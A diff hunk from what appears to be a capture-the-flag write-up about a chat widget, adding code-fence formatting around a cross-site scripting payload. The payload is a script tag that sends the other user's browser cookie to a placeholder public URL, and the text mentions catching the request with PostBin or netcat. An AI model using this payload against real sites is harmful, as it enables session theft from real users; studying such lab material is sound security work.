@@ -12,7 +12,9 @@ We are presented a chat widget and we can chat as user “brewtoot” with user 
 
 `<SCRIPT>` on the other hand works. Our goal is to have the other person disclose their browser cookie. This line is sufficient:
 
+```html
 <SCRIPT>new Image().src="https://PUBLIC_URL/"+document.cookie</SCRIPT>
+````
 
 Note that there will be two incoming requests, one from ourselves and one from the victim. [PostBin](https://postb.in) is a great tool for this, but netcat also works if timed correctly:
 
